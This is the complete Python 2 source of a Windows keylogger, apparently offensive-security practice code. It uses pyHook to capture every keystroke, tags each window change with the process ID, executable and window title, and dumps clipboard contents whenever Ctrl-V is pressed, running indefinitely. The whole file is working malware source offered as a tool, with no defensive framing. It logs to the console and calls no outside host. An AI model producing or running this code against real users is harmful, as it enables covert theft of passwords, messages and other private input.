#@saulpanders
#6/27/18
# keylogger.py : keylogging tool for windows (using pyHook which calls the windows func SetWindowsHookEx)

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():

    #get a handle to foreground windpw
    hwnd = user32.GetForegroundWindow()

    #find the PID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    #store current pid
    process_id = "%d" % pid.value

    #grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    #now read the title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    #print the header if were in the correct process
    print
    print "[ PID: %s - %s - %s]" % (process_id, executable.value, window_title.value)
    print

    #close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):

    global current_window

    #check to see if target changed window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
        
    #if a standard key is pressed
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii)
    else:
        # if ctrl-v, get clipboard
        if event.Key == "V":
            
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s" % (pasted_value)

        else:

            print "[%s]" % event.Key

    #pass execution to next registeed hook
    return True

#create & register hook manager

k1 = pyHook.HookManager()
k1.KeyDown  = KeyStroke

#register hook & execute 5-ever
k1.HookKeyboard()
pythoncom.PumpMessages()


